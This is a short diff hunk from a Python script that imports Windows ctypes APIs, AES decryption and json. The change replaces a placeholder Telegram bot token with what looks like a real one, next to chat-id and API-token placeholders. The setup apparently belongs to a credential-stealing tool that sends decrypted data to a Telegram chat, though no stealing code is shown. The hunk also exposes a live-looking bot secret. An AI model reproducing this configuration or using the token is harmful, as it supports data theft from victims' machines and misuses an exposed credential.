@@ -21,7 +21,7 @@ from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_
 from Crypto.Cipher import AES
 from json import *
 
-bot_token = "here-your-telegram"
+bot_token = "8057737772:AAF2iXgPrqX1MWfPnTEbLpLM0EOrDBVea8s"
 chat_id = "here-your-chat-id"  
 theapi2023 = "Here-Token"
 
